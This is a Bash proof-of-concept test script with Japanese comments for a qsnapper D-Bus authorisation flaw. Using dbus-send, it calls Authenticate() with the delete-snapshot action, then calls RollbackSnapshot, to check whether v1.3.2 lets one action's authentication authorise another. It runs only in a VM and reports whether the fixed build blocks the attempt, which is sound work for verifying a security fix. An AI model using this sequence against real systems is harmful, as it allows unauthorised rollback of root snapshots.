#!/bin/bash
#
# @file poc_action_mixup.sh
# @brief Issue #4b: Authenticate()で任意のactionIdを混用できる問題のPoC
#
# シナリオ:
#   1. Authenticate("com.presire.qsnapper.delete-snapshot")で認証を成立させる
#      → m_authenticated=trueになる
#   2. 続けてRollbackSnapshotを呼ぶ
#      → v1.3.2では権限不要のままロールバックが成立する
#   3. 修正版(P0-2)ではAuthenticate()メソッド自体が削除されておりUnknownMethodになる
#      個別メソッドは全てPolkit判定でしか通らない
#
# 使い方 : poc_action_mixup.sh            (fixedモード)
#          BASELINE=1 poc_action_mixup.sh (baselineモード)
# 終了コード : 0 = 期待どおり、1 = 想定外、2 = 環境エラー
#

set -u    # 未定義変数の参照をエラーにする
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"    # 本スクリプトのあるディレクトリ
source "$SCRIPT_DIR/common.sh"

assert_running_in_vm
assert_qsnapper_service

# Step 1: Authenticate()の存在確認
log "Step 1: probe Authenticate() method existence"
AUTH_OUT=$(dbus-send --system --print-reply --dest="$DBUS_SERVICE" \
    "$DBUS_PATH" "${DBUS_IFACE}.Authenticate" \
    string:"com.presire.qsnapper.delete-snapshot" 2>&1 || true)

# 修正版ではAuthenticate()が削除済みのため、ここで阻止成功として終了する
if echo "$AUTH_OUT" | grep -qE "UnknownMethod|does not exist"; then
    log "Authenticate() is removed — good for fixed build"
    report_result blocked
fi

# Step 2: Authenticate成功を装い、異なるアクションの呼び出しを試す
log "Step 2: attempt RollbackSnapshot after bogus Authenticate"
SNAP_ID=$(ensure_snapshot root)
ROLLBACK_OUT=$(dbus-send --system --print-reply --dest="$DBUS_SERVICE" \
    "$DBUS_PATH" "${DBUS_IFACE}.RollbackSnapshot" \
    string:"root" int32:"$SNAP_ID" 2>&1 || true)

# 別actionIdの認証で通ってしまった場合は脆弱性再現
if echo "$ROLLBACK_OUT" | grep -qE "Error.*(AccessDenied|NotAuthorized)"; then
    log "RollbackSnapshot properly required its own authentication"
    report_result blocked
else
    log "RollbackSnapshot allowed by mixed-action authentication"
    report_result reproduced
fi
